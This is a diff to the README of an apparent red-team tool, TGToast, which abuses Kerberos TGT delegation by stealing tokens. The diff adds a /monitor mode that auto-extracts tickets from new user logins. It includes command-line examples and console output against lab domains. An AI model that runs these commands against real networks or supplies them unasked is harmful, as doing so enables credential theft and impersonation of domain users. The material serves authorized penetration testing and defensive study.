@@ -1,6 +1,6 @@
 
 ```
- .\TGToast.exe
+  .\TGToast.exe
 
       _   __           __________________                 __
      ( `^` ))         /_  __/ ____/_  __/___  ____ ______/ /_
@@ -11,17 +11,20 @@
 
 Tool to perform TGT delegation abuse, with token stealing capabilities.
 
-Usage: C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToasty.exe <option> [arguments]
+Usage: C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe <option> [arguments]
 
 Options:
   /list                                 Lists processes from other domain users.
   /steal <PID> <domain> <spn> [/enctype:TYPE]   Steals token, impersonates, and runs tgtdelegation.
+  /monitor <domain> <spn> [/enctype:TYPE]       Monitors for new user logins and auto-extracts TGTs.
 
   Encryption types (optional): aes256 (default), aes128, rc4
 
-  Example: C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToasty.exe /steal 6969 corp.local CIFS/dc01.corp.local
-  Example: C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToasty.exe /steal 6969 corp.local CIFS/dc01.corp.local /enctype:aes256
-
+Examples:
+  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /steal 6969 corp.local CIFS/dc01.corp.local
+  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /steal 6969 corp.local CIFS/dc01.corp.local /enctype:aes256
+  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /monitor corp.local CIFS/dc01.corp.local
+  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /monitor corp.local CIFS/dc01.corp.local /enctype:rc4
 ```
 ## Purpose
 The goal is to *impersonate* a user who is connected to a machine that is controlled by an attacker and recover their TGT. You need *elevated privileges* on the host.
@@ -92,6 +95,20 @@ AES256
 [+] tgtdelegation succeeded under impersonated context!
 ----------------------------------------------------------------------------
 [*] TGT delegation attempt finished. Reverting to original identity.
+```
+### TGToast Monitor
+Monitors for new user logins and auto-extracts TGTs.
+```
+ .\TGToast.exe /monitor north.sevenkingdoms.local TIME/winterfell.north.sevenkingdoms.local
+
+      _   __           __________________                 __
+     ( `^` ))         /_  __/ ____/_  __/___  ____ ______/ /_
+     |     ||          / / / / __  / / / __ \/ __ `/ ___/ __/
+     |     ||         / / / /_/ / / / / /_/ / /_/ (__  ) /_
+     '-----'`        /_/  \____/ /_/  \____/\__,_/____/\__/
+
+
+[*] Monitoring for new domain users. Press Ctrl+C to stop.
 ```
 
 ## Extract TGT
